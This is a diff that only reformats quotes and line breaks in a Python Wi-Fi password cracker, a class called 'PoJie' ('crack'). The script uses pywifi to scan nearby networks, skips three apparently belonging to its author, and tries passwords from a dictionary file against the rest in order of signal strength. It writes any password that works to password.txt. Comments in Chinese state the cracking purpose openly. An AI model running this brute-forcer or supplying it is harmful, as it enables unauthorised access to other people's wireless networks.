@@ -1,5 +1,5 @@
-#!/usr/bin/env python 
-# -*- coding: utf-8 -*- 
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 """ 
 ------------------------------------------------- 
@@ -14,19 +14,19 @@
 ------------------------------------------------- 
 """
 
-__author__ = 'Black Hole'
+__author__ = "Black Hole"
 
 import time
+
 # 破解wifi库
 import pywifi
 from pywifi import const
 
 
 class PoJie(object):
-
     def __init__(self, path):
         # wifi密码字典文件
-        self.file = open(path, 'r', errors='ignore')
+        self.file = open(path, "r", errors="ignore")
         # 抓取网卡接口
         wifi = pywifi.PyWiFi()
         # 抓取第一个网卡
@@ -45,7 +45,11 @@ class PoJie(object):
         bessis = self.iface.scan_results()
         alist = []
         for data in bessis:
-            if data.ssid == 'Black Hole' or data.ssid == 'ChinaNet-MwHe' or data.ssid == '1602':
+            if (
+                data.ssid == "Black Hole"
+                or data.ssid == "ChinaNet-MwHe"
+                or data.ssid == "1602"
+            ):
                 continue
             alist.append((data.ssid, data.signal))
         # 按信号强度排序
@@ -78,10 +82,15 @@ class PoJie(object):
         if bool1:
             # 保存密码和wifi名到文件中
             save_password_to_file(myStr, ssidname)
-            print('------------------------------------------------密码正确: ' + myStr + '-----' + ssidname)
+            print(
+                "------------------------------------------------密码正确: "
+                + myStr
+                + "-----"
+                + ssidname
+            )
             return True
         else:
-            print('密码错误: ' + myStr + ' ' + ssidname)
+            print("密码错误: " + myStr + " " + ssidname)
             return False
 
     def test_connect(self, findStr, ssidname):
@@ -134,12 +143,12 @@ class PoJie(object):
 
 
 def save_password_to_file(myStr, ssidname):
-    with open('password.txt', 'a') as fp:
-        fp.write(str(myStr) + '-->' + str(ssidname))
+    with open("password.txt", "a") as fp:
+        fp.write(str(myStr) + "-->" + str(ssidname))
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     # 密码字典文件所在路径
-    path = './pass.txt'  # 此处是wifi密码字典文件的位置
+    path = "./pass.txt"  # 此处是wifi密码字典文件的位置
     start = PoJie(path)
     start.run()
